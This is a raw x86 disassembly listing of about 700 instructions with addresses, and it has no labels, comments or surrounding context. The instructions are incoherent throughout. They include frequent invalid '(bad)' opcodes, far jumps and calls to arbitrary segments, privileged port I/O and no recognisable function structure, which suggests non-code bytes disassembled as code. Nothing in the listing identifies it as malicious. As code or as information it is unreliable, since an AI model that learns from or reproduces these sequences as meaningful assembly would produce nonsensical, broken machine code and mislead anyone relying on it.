  40c1fe:	jmp    0xad77:0x5ad94ae3
  40c205:	lds    esi,FWORD PTR [edi-0x126c7bd4]
  40c20b:	sub    BYTE PTR [eax-0x1e41e57a],0x58
  40c212:	push   esi
  40c213:	(bad)  
  40c214:	jns    0x40c25f
  40c216:	js     0x40c26c
  40c218:	stos   DWORD PTR es:[edi],eax
  40c219:	aam    0x92
  40c21b:	(bad)  
  40c21d:	int    0x5d
  40c21f:	popa   
  40c220:	jno    0x40c1fc
  40c222:	ss popa 
  40c224:	pop    ss
  40c225:	adc    al,0xfe
  40c227:	add    DWORD PTR [ebp+0x458b54ec],edx
  40c22d:	in     eax,dx
  40c22e:	bound  ebx,QWORD PTR [esi+0x2328b96e]
  40c234:	ja     0x40c257
  40c236:	ret    
  40c237:	imul   eax,DWORD PTR [eax+0xfd04fcb],0x3be0dd02
  40c241:	push   ebp
  40c242:	push   0xffffffb5
  40c244:	test   BYTE PTR [ebx],cl
  40c246:	int3   
  40c247:	adc    bh,dl
  40c249:	retf   0xb3e4
  40c24c:	je     0x40c2b6
  40c24e:	xchg   ebx,eax
  40c24f:	xlat   BYTE PTR ds:[ebx]
  40c250:	jnp    0x40c203
  40c252:	addr16 cli 
  40c254:	lock add al,0xc1
  40c257:	ret    0x1232
  40c25a:	xor    DWORD PTR [edx-0x6bc55c5],edi
  40c260:	adc    al,0x45
  40c262:	push   eax
  40c263:	(bad)  
  40c264:	hlt    
  40c265:	mov    edi,0xb76dc5fa
  40c26a:	inc    eax
  40c26b:	cwde   
  40c26c:	outs   dx,BYTE PTR ds:[esi]
  40c26d:	inc    ebp
  40c26e:	stc    
  40c26f:	nop
  40c270:	sub    BYTE PTR [eax*1-0x380d029a],ah
  40c277:	repz sub DWORD PTR [edi],eax
  40c27a:	clc    
  40c27b:	push   eax
  40c27c:	sub    DWORD PTR cs:[eax-0x73e0c9f5],edx
  40c283:	icebp  
  40c284:	inc    edx
  40c285:	sub    eax,0x6076ba8d
  40c28a:	mov    ebx,0xf0c80bf8
  40c28f:	sub    al,0x7e
  40c291:	dec    ecx
  40c292:	hlt    
  40c293:	mov    edi,0xda632019
  40c298:	fld    QWORD PTR [ecx]
  40c29a:	sub    dl,bl
  40c29c:	test   BYTE PTR [esp+edi*8+0x17c194e],ah
  40c2a3:	stos   BYTE PTR es:[edi],al
  40c2a4:	lock popf 
  40c2a6:	mov    BYTE PTR [ecx],bl
  40c2a8:	dec    edi
  40c2a9:	mov    eax,ds:0x8bec27c8
  40c2ae:	push   ds
  40c2af:	push   es
  40c2b0:	call   0x4b5fbe85
  40c2b5:	rcr    esp,cl
  40c2b7:	ror    DWORD PTR [esi+eax*8-0x12f61230],0xf3
  40c2bf:	mov    ebx,0x3e007ea5
  40c2c4:	cli    
  40c2c5:	xchg   ecx,eax
  40c2c6:	dec    esp
  40c2c7:	(bad)  
  40c2c8:	test   eax,0xfa061870
  40c2cd:	prefetch BYTE PTR [eax]
  40c2d0:	inc    ebp
  40c2d1:	aas    
  40c2d2:	data16 mov dl,0x38
  40c2d5:	in     eax,0x89
  40c2d7:	jmp    0x40c285
  40c2d9:	call   0x884f3f5f
  40c2de:	xchg   ecx,eax
  40c2df:	mov    esp,0x7314b38c
  40c2e4:	ins    BYTE PTR es:[edi],dx
  40c2e5:	icebp  
  40c2e6:	out    0xca,eax
  40c2e8:	mov    DWORD PTR [ecx-0x53f65fb9],ebx
  40c2ee:	lahf   
  40c2ef:	cld    
  40c2f0:	clc    
  40c2f1:	fnsave [edi]
  40c2f3:	nop
  40c2f4:	(bad)  [ebx+0x7cce81f6]
  40c2fa:	psubsb mm6,QWORD PTR [eax-0x7d]
  40c2fe:	pop    ss
  40c2ff:	xchg   edx,eax
  40c300:	add    esp,DWORD PTR [eax]
  40c302:	lahf   
  40c303:	sbb    ch,BYTE PTR [ebx+0x4c]
  40c306:	je     0x40c330
  40c308:	nop
  40c309:	sbb    BYTE PTR [ebx-0xdca6ebc],ch
  40c30f:	sub    al,0x59
  40c311:	push   edx
  40c312:	pop    eax
  40c313:	adc    esi,esp
  40c315:	out    dx,eax
  40c316:	arpl   WORD PTR [ebx],bx
  40c318:	lds    esp,FWORD PTR gs:[ebx]
  40c31b:	les    esi,FWORD PTR [ebx-0x60]
  40c31e:	das    
  40c31f:	xor    eax,0x67753445
  40c324:	rcl    ch,cl
  40c326:	repz cli 
  40c328:	jno    0x40c30c
  40c32a:	loope  0x40c300
  40c32c:	push   edx
  40c32d:	jle    0x40c2d9
  40c32f:	mov    eax,ds:0xb19de390
  40c334:	ret    
  40c335:	xor    edx,edi
  40c337:	adc    ah,bl
  40c339:	jo     0x40c396
  40c33b:	in     al,dx
  40c33c:	rcl    DWORD PTR [ebx+0x62831293],0x1b
  40c343:	sub    eax,0x97339a18
  40c348:	dec    edi
  40c349:	jo     0x40c336
  40c34b:	dec    esp
  40c34c:	cmp    edi,esp
  40c34e:	cmp    ecx,ebx
  40c350:	jne    0x40c364
  40c352:	out    dx,al
  40c353:	fld    DWORD PTR [edi-0x1e902118]
  40c359:	inc    ebx
  40c35a:	jbe    0x40c379
  40c35c:	cs dec esp
  40c35e:	mov    eax,0x6d7bcefd
  40c363:	mov    ds:0xd18a2ec7,eax
  40c368:	retf   0x6210
  40c36b:	les    edx,FWORD PTR [edi]
  40c36d:	outs   dx,BYTE PTR ds:[esi]
  40c36e:	mov    ds:0x4c85b246,al
  40c373:	pop    ds
  40c374:	cmc    
  40c375:	or     BYTE PTR [edi+esi*2+0x71],0x83
  40c37a:	push   edi
  40c37b:	mov    eax,0x61c38892
  40c380:	mov    esi,0x3f8c6cd7
  40c385:	and    al,0x4c
  40c387:	imul   eax,esi,0xfffffff7
  40c38a:	xor    eax,0x776873a1
  40c38f:	jge    0x40c3f7
  40c391:	std    
  40c392:	ror    edi,cl
  40c394:	xchg   esp,eax
  40c395:	bound  ebx,QWORD PTR [ecx]
  40c397:	jno    0x40c3dd
  40c399:	dec    ebx
  40c39a:	aaa    
  40c39b:	mov    ch,ah
  40c39d:	dec    eax
  40c39e:	fadd   QWORD PTR [ebx*8-0x6c07f596]
  40c3a5:	sbb    cl,cl
  40c3a7:	mov    al,0xf5
  40c3a9:	call   edi
  40c3ab:	loopne 0x40c362
  40c3ad:	sbb    ch,ah
  40c3af:	(bad)  
  40c3b0:	call   0x8485:0xea103e77
  40c3b7:	test   al,0x91
  40c3b9:	jnp    0x40c39c
  40c3bb:	arpl   WORD PTR [edx+0x1f93b21b],dx
  40c3c1:	jae    0x40c3ac
  40c3c3:	jp     0x40c362
  40c3c5:	lahf   
  40c3c6:	inc    esi
  40c3c7:	in     al,dx
  40c3c8:	dec    ebx
  40c3c9:	ret    0xc13a
  40c3cc:	nop
  40c3cd:	cmp    BYTE PTR [ebx+0x4c],ah
  40c3d0:	call   0x4ba4:0xc6e85fc9
  40c3d7:	mov    BYTE PTR [esi-0x44],dl
  40c3da:	test   eax,0x1bc2bfde
  40c3df:	loope  0x40c437
  40c3e1:	sub    DWORD PTR [edi],ebp
  40c3e3:	retf   
  40c3e4:	pop    edx
  40c3e5:	pop    ebp
  40c3e6:	mov    edi,0x17a9d34c
  40c3eb:	int3   
  40c3ec:	popf   
  40c3ed:	inc    eax
  40c3ee:	(bad)  
  40c3ef:	cmp    dh,al
  40c3f1:	hlt    
  40c3f2:	out    dx,al
  40c3f3:	rcr    DWORD PTR [ebp+0x620c147],cl
  40c3f9:	std    
  40c3fa:	scas   eax,DWORD PTR es:[edi]
  40c3fb:	int    0x81
  40c3fd:	mov    ebx,0x9fe038c
  40c402:	sbb    ch,BYTE PTR [esp+ecx*1+0x16]
  40c406:	xor    BYTE PTR [ebp-0x1f3c61e0],ch
  40c40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c40d:	out    0x8c,al
  40c40f:	(bad)  
  40c410:	dec    DWORD PTR [ecx]
  40c412:	fnstsw WORD PTR [edx]
  40c414:	push   ds
  40c415:	aam    0x2c
  40c417:	jp     0x40c3cf
  40c419:	idiv   DWORD PTR [ebx]
  40c41b:	test   al,0x32
  40c41d:	enter  0x5ec6,0xe4
  40c421:	inc    ebp
  40c422:	or     dl,BYTE PTR [eax+ebp*1-0x71b63018]
  40c429:	sbb    eax,0xfe2123f7
  40c42e:	and    ah,al
  40c430:	sti    
  40c431:	leave  
  40c432:	leave  
  40c433:	or     eax,0xb0630d6b
  40c438:	add    DWORD PTR [ecx+0x2727cfbe],edi
  40c43e:	fmul   QWORD PTR [eax-0x6008a40e]
  40c444:	cdq    
  40c445:	inc    ecx
  40c446:	and    DWORD PTR [edi+0xc],esi
  40c449:	mov    bl,0x64
  40c44b:	daa    
  40c44c:	sbb    BYTE PTR [edx-0x1ecaa73c],dh
  40c452:	rol    DWORD PTR ds:0x7fc1c091,0x53
  40c459:	das    
  40c45a:	push   ss
  40c45b:	sub    al,0x51
  40c45d:	retf   0x9c08
  40c460:	xor    al,0x9b
  40c462:	arpl   WORD PTR [ebp+0x57379edb],cx
  40c468:	in     al,dx
  40c469:	jp     0x40c4c2
  40c46b:	push   ecx
  40c46c:	ss push edi
  40c46e:	cdq    
  40c46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c470:	xchg   esi,eax
  40c471:	dec    esi
  40c472:	and    DWORD PTR [ecx-0x5175b771],edi
  40c478:	mov    ecx,0x713aa38e
  40c47d:	jbe    0x40c440
  40c47f:	sbb    edi,DWORD PTR [esi+ebx*4]
  40c482:	pop    esp
  40c483:	ds sub al,0xe8
  40c486:	mov    edi,0x8ff1ac0a
  40c48b:	and    ebp,0x62
  40c48e:	mov    bh,0x8d
  40c490:	shl    BYTE PTR [esi+0x3ed751b0],1
  40c496:	add    al,0xf3
  40c498:	inc    BYTE PTR [edi]
  40c49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c49b:	add    esp,DWORD PTR [ecx+edi*2-0x59b3dc71]
  40c4a2:	mov    BYTE PTR [ecx+0x1c4401bb],dh
  40c4a8:	scas   al,BYTE PTR es:[edi]
  40c4a9:	cmc    
  40c4aa:	inc    ecx
  40c4ab:	popa   
  40c4ac:	retf   0xef56
  40c4af:	dec    ebx
  40c4b0:	les    ecx,FWORD PTR [esi-0x11c84d62]
  40c4b6:	call   0xbdd7c8a3
  40c4bb:	mov    bh,0x96
  40c4bd:	repnz pop edi
  40c4bf:	sub    DWORD PTR [eax+eax*4+0x65],ecx
  40c4c3:	xor    al,BYTE PTR [edx-0x2]
  40c4c6:	jbe    0x40c45a
  40c4c8:	in     eax,0x57
  40c4ca:	lods   al,BYTE PTR ds:[esi]
  40c4cb:	adc    al,0xf1
  40c4cd:	in     eax,0x77
  40c4cf:	out    dx,eax
  40c4d0:	rcl    BYTE PTR [ebx],0xa2
  40c4d3:	popf   
  40c4d4:	or     al,0x5a
  40c4d6:	cmp    esp,DWORD PTR [ecx+0x2e]
  40c4d9:	or     eax,0x31e1cd9e
  40c4de:	cmp    ah,dl
  40c4e0:	scas   al,BYTE PTR es:[edi]
  40c4e1:	(bad)  
  40c4e2:	and    cl,ah
  40c4e4:	fs data16 mov ch,0xfc
  40c4e8:	lds    ebp,FWORD PTR [ebp-0x33]
  40c4eb:	dec    esp
  40c4ec:	stc    
  40c4ed:	dec    edx
  40c4ee:	setns  BYTE PTR [esi+0x29]
  40c4f2:	or     ah,bh
  40c4f4:	mov    ebp,DWORD PTR [edx]
  40c4f6:	xor    eax,0x69c9753b
  40c4fb:	ins    BYTE PTR es:[edi],dx
  40c4fc:	or     edi,edi
  40c4fe:	int3   
  40c4ff:	fcom   DWORD PTR [esi-0x5b2ae5a1]
  40c505:	jno    0x40c52b
  40c507:	sahf   
  40c508:	popa   
  40c509:	push   esp
  40c50a:	and    al,0x87
  40c50c:	test   al,0xb2
  40c50e:	icebp  
  40c50f:	sbb    esi,0xed4d4668
  40c515:	and    esi,DWORD PTR [esp+edi*8]
  40c518:	imul   DWORD PTR [esi-0x56770cce]
  40c51e:	int    0x4e
  40c520:	pop    esi
  40c521:	sbb    al,0x5
  40c523:	fwait
  40c524:	xor    BYTE PTR [ecx-0x37],cl
  40c527:	cmp    BYTE PTR [edi+edx*1],bh
  40c52a:	pop    edi
  40c52b:	lea    esp,[edx+0x43]
  40c52e:	aad    0x66
  40c530:	add    dh,BYTE PTR [ebx]
  40c532:	stc    
  40c533:	cld    
  40c534:	mov    eax,0x68b839cc
  40c539:	jecxz  0x40c56f
  40c53b:	xor    esi,DWORD PTR [esi-0x5a]
  40c53e:	pop    edi
  40c53f:	or     DWORD PTR [ebp-0x49537b04],esi
  40c545:	cdq    
  40c546:	or     eax,0x58b149fa
  40c54b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c54c:	pushf  
  40c54d:	pop    edx
  40c54e:	or     bh,BYTE PTR [ebx+eiz*8+0x4cd4186b]
  40c555:	loopne 0x40c55b
  40c557:	test   al,0x54
  40c559:	sbb    eax,0x615d0c95
  40c55e:	push   ecx
  40c55f:	cmp    al,0x7b
  40c561:	inc    eax
  40c562:	stos   DWORD PTR es:[edi],eax
  40c563:	ja     0x40c55c
  40c565:	push   ss
  40c566:	inc    ecx
  40c567:	adc    dh,ch
  40c569:	adc    eax,0x647987d4
  40c56e:	adc    al,0x69
  40c570:	test   DWORD PTR [ebx+0x35405bd5],ebx
  40c576:	cli    
  40c577:	je     0x40c581
  40c579:	test   BYTE PTR ds:0x80ac7535,al
  40c57f:	int3   
  40c580:	inc    ebp
  40c581:	rcr    BYTE PTR [ebp*4-0x63e6967a],1
  40c588:	jmp    0x74ed:0xde3f67fb
  40c58f:	mov    esp,0x1aab89e3
  40c594:	mov    esp,0xa9254e32
  40c599:	jmp    0x4256:0x57a7c72f
  40c5a0:	mov    DWORD PTR [esi],ebp
  40c5a2:	cmp    al,0xd7
  40c5a4:	or     ebp,ebx
  40c5a6:	arpl   WORD PTR [ebx+0x46],cx
  40c5a9:	call   0xd7f64dd4
  40c5ae:	mov    dl,0x29
  40c5b0:	and    al,0x4c
  40c5b2:	inc    ecx
  40c5b3:	cli    
  40c5b4:	cli    
  40c5b5:	je     0x40c596
  40c5b7:	add    eax,esi
  40c5b9:	mov    ch,0x45
  40c5bb:	aaa    
  40c5bc:	mov    ah,0x4c
  40c5be:	sbb    BYTE PTR [ecx],dl
  40c5c0:	sub    eax,0x5f9f53fa
  40c5c5:	int3   
  40c5c6:	scas   al,BYTE PTR es:[edi]
  40c5c7:	icebp  
  40c5c8:	fdivr  QWORD PTR [edi]
  40c5ca:	fiadd  DWORD PTR [edi-0x1c]
  40c5cd:	pop    edx
  40c5ce:	sub    bh,0xcf
  40c5d1:	adc    al,0x52
  40c5d3:	lds    eax,FWORD PTR [edi]
  40c5d5:	into   
  40c5d6:	call   0x8c7c9670
  40c5db:	adc    eax,DWORD PTR [eax-0x56]
  40c5de:	sub    eax,edx
  40c5e0:	(bad)  
  40c5e1:	out    0x14,al
  40c5e3:	pop    edx
  40c5e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e5:	inc    ecx
  40c5e6:	scas   eax,DWORD PTR es:[edi]
  40c5e7:	call   0x3361afb8
  40c5ec:	inc    esp
  40c5ed:	xchg   ecx,eax
  40c5ee:	dec    ebx
  40c5ef:	xchg   ebp,eax
  40c5f0:	push   edi
  40c5f1:	int    0xab
  40c5f3:	xor    ebp,ecx
  40c5f5:	pop    ebx
  40c5f6:	ds pop ecx
  40c5f8:	into   
  40c5f9:	dec    esi
  40c5fa:	xchg   esi,eax
  40c5fb:	mov    edx,0xf6e94a80
  40c600:	(bad)  
  40c602:	ins    BYTE PTR es:[edi],dx
  40c603:	xor    BYTE PTR [esi],dh
  40c605:	push   cs
  40c606:	pop    esi
  40c607:	les    ebx,FWORD PTR [ecx]
  40c609:	sti    
  40c60a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c60b:	shl    DWORD PTR [esp+ebp*2+0x10fd6b9b],0x14
  40c613:	and    edi,edx
  40c615:	xor    DWORD PTR [ecx],ecx
  40c617:	cmp    eax,0xdaea0a6f
  40c61c:	or     cl,BYTE PTR [esi-0x23]
  40c61f:	or     eax,0x328fbf57
  40c624:	sti    
  40c625:	xor    esp,edi
  40c627:	push   0x6db099b0
  40c62c:	loopne 0x40c5c0
  40c62e:	xchg   esp,eax
  40c62f:	retf   0x1413
  40c632:	push   es
  40c633:	inc    edx
  40c634:	push   eax
  40c635:	hlt    
  40c636:	(bad)  
  40c637:	sub    eax,0xbbe7b7fd
  40c63c:	push   ds
  40c63d:	fcom   DWORD PTR [eax]
  40c63f:	push   es
  40c640:	aad    0x5c
  40c642:	mov    ebx,DWORD PTR [edi+ebp*8+0x4b]
  40c646:	ss hlt 
  40c648:	arpl   cx,bp
  40c64a:	aaa    
  40c64b:	xchg   ebx,eax
  40c64c:	out    dx,al
  40c64d:	add    DWORD PTR [ecx+eiz*4+0x4143dca8],ebp
  40c654:	stos   DWORD PTR es:[edi],eax
  40c655:	mov    ss,WORD PTR [edx+edi*1-0x7dc7c086]
  40c65c:	mov    ecx,DWORD PTR [esi]
  40c65e:	cdq    
  40c65f:	inc    edi
  40c660:	sub    al,cl
  40c662:	pop    eax
  40c663:	adc    cl,BYTE PTR ds:0xdb2aee13
  40c669:	or     eax,0xa9c22925
  40c66e:	add    ah,BYTE PTR [edi+0x23719bb7]
  40c674:	clc    
  40c675:	or     ah,BYTE PTR [ecx-0x17]
  40c678:	adc    al,0x33
  40c67a:	mov    WORD PTR [ebx-0x4054c266],ds
  40c680:	fs cs jge 0x40c6bd
  40c684:	test   BYTE PTR [eax-0x57],dl
  40c687:	in     al,0xd2
  40c689:	out    0xfa,eax
  40c68b:	(bad)  
  40c68c:	dec    ebx
  40c68d:	stc    
  40c68e:	jae    0x40c674
  40c690:	jo     0x40c61e
  40c692:	and    BYTE PTR [esi+0x207c64b9],cl
  40c698:	push   ebp
  40c699:	xchg   ebp,esp
  40c69b:	push   0x30
  40c69d:	adc    al,0x9b
  40c69f:	call   0x51b293b9
  40c6a4:	fwait
  40c6a5:	out    dx,al
  40c6a6:	xor    bl,BYTE PTR ds:0x99f2a4bc
  40c6ac:	jle    0x40c6e2
  40c6ae:	(bad)  [ebp-0x75446077]
  40c6b4:	lods   eax,DWORD PTR ds:[esi]
  40c6b5:	jnp    0x40c6f9
  40c6b7:	sar    DWORD PTR [ecx],0x16
  40c6ba:	mov    eax,ds:0x4efce6d4
  40c6bf:	or     al,0x18
  40c6c1:	test   DWORD PTR [edx-0x1f],0xa199ea70
  40c6c8:	fxch   st(4)
  40c6ca:	(bad)  
  40c6cb:	sar    BYTE PTR [esp+eax*4+0x7bf3e130],1
  40c6d2:	mov    esi,0x9b8dd29f
  40c6d7:	out    dx,al
  40c6d8:	mov    dh,0x89
  40c6da:	test   DWORD PTR [ecx],eax
  40c6dc:	fwait
  40c6dd:	sub    ebx,esi
  40c6df:	push   0xa32f0156
  40c6e4:	jb     0x40c6d7
  40c6e6:	or     esp,DWORD PTR [ebx-0x5]
  40c6e9:	dec    edi
  40c6ea:	push   0x68
  40c6ec:	fimul  DWORD PTR [ebx]
  40c6ee:	or     eax,0xee57e34d
  40c6f3:	test   BYTE PTR [edx-0xc15749b],cl
  40c6f9:	loopne 0x40c6d4
  40c6fb:	call   0x18aaa18e
  40c700:	(bad)  
  40c701:	adc    al,0xb4
  40c703:	mov    bh,0xcd
  40c705:	hlt    
  40c706:	pop    ds
  40c707:	sub    bh,cl
  40c709:	mov    ebx,0x96a28ee2
  40c70e:	or     eax,0x24148572
  40c713:	loop   0x40c6b4
  40c715:	in     eax,dx
  40c716:	ins    BYTE PTR es:[edi],dx
  40c717:	out    dx,al
  40c718:	test   DWORD PTR ds:0xb1f9c1b2,ebx
  40c71e:	mov    al,ds:0x3f8fe312
  40c723:	mov    edx,0xaf1e23d8
  40c728:	retf   
  40c729:	test   eax,0x9eb7b11b
  40c72e:	fdivr  DWORD PTR [ebx+eax*2-0x6e1dd309]
  40c735:	fisttp WORD PTR [ebx]
  40c737:	gs nop
  40c739:	xchg   ebp,eax
  40c73a:	and    DWORD PTR [ebx+0x2],esp
  40c73d:	cmp    dl,al
  40c73f:	out    dx,al
  40c740:	in     al,0xfa
  40c742:	mov    al,ds:0xed881d01
  40c747:	fnstenv [eax+0x4dd938ea]
  40c74d:	xchg   ebp,eax
  40c74e:	mov    ah,0x33
  40c750:	jmp    0xb0bb:0x4f6679f1
  40c757:	jb     0x40c72c
  40c759:	mov    esp,0xf3e0cacc
  40c75e:	in     al,dx
  40c75f:	mov    eax,ds:0x2cfb8c3f
  40c764:	mov    dh,0xfe
  40c766:	cmp    cl,BYTE PTR [edx+eiz*8]
  40c769:	mov    es,WORD PTR [edx-0x7c]
  40c76c:	pop    ss
  40c76d:	repz enter 0xbbb1,0xe9
  40c772:	inc    edi
  40c773:	aaa    
  40c774:	mov    fs,WORD PTR [ecx]
  40c776:	clc    
  40c777:	xchg   BYTE PTR [edx+ebp*8-0x71],dh
  40c77b:	mov    dl,0x25
  40c77d:	test   eax,0x4ca2e8b1
  40c782:	adc    al,0xea
  40c784:	cdq    
  40c785:	jmp    0x3c28:0x78807883
  40c78c:	jle    0x40c713
  40c78e:	cli    
  40c78f:	arpl   WORD PTR [ebp-0x5fd13113],cx
  40c795:	sbb    DWORD PTR ds:0xb7ed91f0,0xffffff9d
  40c79c:	ins    DWORD PTR es:[edi],dx
  40c79d:	dec    esi
  40c79e:	sub    al,0x8c
  40c7a0:	mov    edi,0x47add2e0
  40c7a5:	pop    ecx
  40c7a6:	retf   0x43f4
  40c7a9:	pop    edx
  40c7aa:	repz mov ch,0x45
  40c7ad:	mov    BYTE PTR [ebp+0x2d494951],ch
  40c7b3:	or     eax,0x87e45d60
  40c7b8:	or     DWORD PTR [ebx],ebp
  40c7ba:	xor    dl,BYTE PTR [edi+0x76]
  40c7bd:	sahf   
  40c7be:	jo     0x40c777
  40c7c0:	cmp    ebp,DWORD PTR [ebx+eiz*1-0x535d8a9f]
  40c7c7:	js     0x40c799
  40c7c9:	int3   
  40c7ca:	cmp    ch,BYTE PTR [eax]
  40c7cc:	mov    WORD PTR [edx+0x1033a26e],?
  40c7d2:	sub    al,0xa4
  40c7d4:	cmp    eax,0x38085820
  40c7d9:	cs sbb eax,0x69f35d43
  40c7df:	or     BYTE PTR ds:0xc3752da7,bl
  40c7e5:	psubusb mm1,QWORD PTR ds:0x2734f063
  40c7ec:	pusha  
  40c7ed:	int3   
  40c7ee:	js     0x40c861
  40c7f0:	xor    bl,ch
  40c7f2:	inc    ebx
  40c7f3:	and    eax,0xd274428d
  40c7f8:	ins    DWORD PTR es:[edi],dx
  40c7f9:	(bad)  
  40c7fa:	je     0x40c7fd
  40c7fc:	ret    0x4d5c
  40c7ff:	mov    ?,WORD PTR [esi]
  40c801:	sbb    BYTE PTR [esi+ebx*4-0x3342f437],0xcf
  40c809:	outs   dx,BYTE PTR ds:[esi]
  40c80a:	xchg   edi,eax
  40c80b:	xchg   ebp,eax
  40c80c:	ret    0x5cbf
  40c80f:	out    dx,eax
  40c810:	dec    ebx
  40c811:	mov    fs,edx
  40c813:	mov    dh,0x85
  40c815:	jb     0x40c81b
  40c817:	hlt    
  40c818:	push   ebx
  40c819:	daa    
  40c81a:	xor    ecx,DWORD PTR [edi-0x1fac4bdb]
  40c820:	push   ss
  40c821:	sbb    al,0x9b
  40c823:	inc    esi
  40c824:	fmul   DWORD PTR [esi+edx*4+0xd]
  40c828:	add    al,0xe0
  40c82a:	outs   dx,DWORD PTR ds:[esi]
  40c82b:	push   ss
  40c82c:	js     0x40c844
  40c82e:	daa    
  40c82f:	mov    edi,0x63ea69be
  40c834:	(bad)  
  40c837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c838:	and    BYTE PTR [eax],0xdb
  40c83b:	sub    ch,ah
  40c83d:	lea    esi,[ecx-0x9]
  40c840:	mov    eax,ds:0x7dc4176b
  40c845:	pop    edx
  40c846:	push   edx
  40c847:	push   ss
  40c848:	and    DWORD PTR [eax],ecx
  40c84a:	jmp    0x8c0e:0x237b6418
  40c851:	push   ebx
  40c852:	and    BYTE PTR [ecx+0x6ab8f20b],0x77
  40c859:	(bad)  
  40c85a:	lock sbb eax,0x6a0ba962
  40c860:	mov    ds:0x4ddb4c37,eax
  40c865:	jnp    0x40c8b9
  40c867:	or     al,0xbc
  40c869:	jle    0x40c8a0
  40c86b:	imul   esp,eax,0xb7cd69d6
  40c871:	or     DWORD PTR [edx],edx
  40c873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c874:	outs   dx,DWORD PTR ds:[esi]
  40c875:	xchg   edi,eax
  40c876:	jo     0x40c800
  40c878:	push   0x26
  40c87a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87b:	cs shr eax,0xf9
  40c87f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c880:	into   
  40c881:	mov    edx,DWORD PTR [ebx]
  40c883:	imul   BYTE PTR [edi]
  40c885:	xlat   BYTE PTR ds:[ebx]
  40c886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c887:	fsubr  QWORD PTR [edi+0x47b16db2]
  40c88d:	inc    ebp
  40c88e:	pop    ecx
  40c88f:	push   eax
  40c890:	stos   DWORD PTR es:[edi],eax
  40c891:	ret    0xcce4
  40c894:	mov    esi,0xa1e89286
  40c899:	sub    edx,esi
  40c89b:	inc    esi
  40c89c:	stos   DWORD PTR es:[edi],eax
  40c89d:	scas   eax,DWORD PTR es:[edi]
  40c89e:	dec    ebx
  40c89f:	inc    esp
  40c8a0:	xor    ebx,DWORD PTR [ecx+0x4ce15a13]
  40c8a6:	pop    ebp
  40c8a7:	in     al,0x4f
  40c8a9:	fs xor esi,esi
  40c8ac:	xchg   edx,eax
  40c8ad:	dec    ecx
  40c8ae:	and    eax,0xdbf892aa
  40c8b3:	test   BYTE PTR [ebp-0x74],ah
  40c8b6:	aam    0x7e
  40c8b8:	push   ss
  40c8b9:	out    dx,al
  40c8ba:	popf   
  40c8bb:	adc    DWORD PTR [eax-0x14],ebp
  40c8be:	popf   
  40c8bf:	sub    bh,BYTE PTR [ebx]
  40c8c1:	mov    dh,0xbd
  40c8c3:	pop    esp
  40c8c4:	test   BYTE PTR [ebx-0x35],dh
  40c8c7:	jmp    esp
  40c8c9:	mov    dh,0x40
  40c8cb:	and    eax,0xa00f2f81
  40c8d0:	cmp    al,0xab
  40c8d2:	push   ebx
  40c8d3:	xor    ebx,ecx
  40c8d5:	jbe    0x40c94f
  40c8d7:	shr    BYTE PTR [ebx+ebp*2+0x4f24996f],1
  40c8de:	lds    edi,FWORD PTR [eax-0x14]
  40c8e1:	mov    esi,DWORD PTR [edi+0x62]
  40c8e4:	repnz mov bl,0x6c
  40c8e7:	xlat   BYTE PTR ds:[ebx]
  40c8e8:	adc    al,0x89
  40c8ea:	dec    edx
  40c8eb:	ins    DWORD PTR es:[edi],dx
  40c8ec:	cdq    
  40c8ed:	mov    cl,BYTE PTR [eax]
  40c8ef:	hlt    
  40c8f0:	psubd  mm3,QWORD PTR [ebx]
  40c8f3:	mov    DWORD PTR [ebp-0x4e],eax
  40c8f6:	mov    dh,0xde
  40c8f8:	(bad)  
  40c8f9:	push   esp
  40c8fa:	xor    DWORD PTR [ebx],edx
  40c8fc:	fnstcw WORD PTR [ecx-0x38]
  40c8ff:	sub    BYTE PTR [edx],ch
  40c901:	mov    ebp,0x359bed5
  40c906:	sahf   
  40c907:	mov    ds:0xf27b7104,al
  40c90c:	fst    QWORD PTR [ecx-0x19]
  40c90f:	xchg   ebx,eax
  40c910:	or     ah,BYTE PTR [ebp-0x2bcc2c07]
  40c916:	push   edx
  40c917:	cmp    BYTE PTR [edx+0x5d10b6f],dh
  40c91d:	and    DWORD PTR [eax-0x62e8a174],0x68
  40c924:	out    0x7,eax
  40c926:	fdiv   QWORD PTR [ecx-0x5e]
  40c929:	cwde   
  40c92a:	fst    QWORD PTR [edx-0x47]
  40c92d:	or     DWORD PTR [edx],esp
  40c92f:	nop
  40c930:	test   BYTE PTR [ecx+0x7231d405],bh
  40c936:	dec    DWORD PTR [edi]
  40c938:	rcr    DWORD PTR [eax-0x5e],cl
  40c93b:	mov    ah,0xdf
  40c93d:	jbe    0x40c9b7
  40c93f:	test   eax,0x815a31f0
  40c944:	cmc    
  40c945:	ffreep st(6)
  40c947:	cmp    al,0xb8
  40c949:	mov    edx,0x6ad68703
  40c94e:	scas   eax,DWORD PTR es:[edi]
  40c94f:	ficomp DWORD PTR [ebp-0x1140fa22]
  40c955:	cs cld 
  40c957:	sahf   
  40c958:	push   es
  40c959:	ror    BYTE PTR [ebx+0x5ff0c6ba],cl
  40c95f:	sbb    BYTE PTR [eax+esi*1],al
  40c962:	(bad)  
  40c963:	xchg   esp,eax
  40c964:	add    eax,edx
  40c966:	lds    ecx,FWORD PTR [edi-0xfee4446]
  40c96c:	test   BYTE PTR [ecx+0x10],bh
  40c96f:	icebp  
  40c970:	sbb    BYTE PTR [ebp-0x380ce498],dl
  40c976:	fs ins BYTE PTR es:[edi],dx
  40c978:	bound  edx,QWORD PTR [ebx]
  40c97a:	enter  0xb2be,0x91
  40c97e:	push   es
  40c97f:	mov    edi,0xcf52b347
  40c984:	sub    DWORD PTR [esi],0xeb15b59a
  40c98a:	jo     0x40c924
  40c98c:	ja     0x40c9b5
  40c98e:	adc    bl,BYTE PTR [edx-0x4b]
  40c991:	mov    ebx,0x5177f24
  40c996:	ret    
  40c997:	repz in eax,0x4b
  40c99a:	jo     0x40c93e
  40c99c:	inc    ebx
  40c99d:	jmp    0x6afd28e0
  40c9a2:	xor    esi,eax
